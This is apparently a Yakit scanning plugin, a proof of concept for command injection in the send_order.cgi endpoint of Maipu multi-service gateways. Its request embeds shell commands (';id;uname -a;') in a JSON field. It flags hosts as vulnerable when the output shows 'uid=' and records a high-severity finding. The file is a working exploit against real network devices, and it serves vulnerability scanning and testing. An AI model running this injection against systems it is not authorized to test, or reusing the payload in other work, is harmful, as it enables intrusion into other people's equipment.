# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `POST /send_order.cgi?parameter=operation HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64MHhzZWM=; x64; rv:99.0) Gecko/20100101 Firefox/99.0
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

{"opid":"1","name":";id;uname -a;","type":"rest"}
`

    rsp,req,_ = poc.HTTP(packet,
    poc.params({"target": addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    poc.timeout(5),
    )


    //dump(rsp)
        if str.MatchAllOfSubString(rsp,'HTTP/1.1 200','uid='){
        yakit.Info("%v found 迈普多业务融合网关send_order.cgi  命令执行漏洞", addr)
        risk.NewRisk(
        addr,
        risk.title("迈普多业务融合网关send_order.cgi  命令执行漏洞"),
        risk.severity("high"),
        risk.titleVerbose("迈普多业务融合网关send_order.cgi  命令执行漏洞"),
        risk.request(string(req)),
        risk.response(string(rsp)),
        risk.cve("no cve"),
    )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }

}
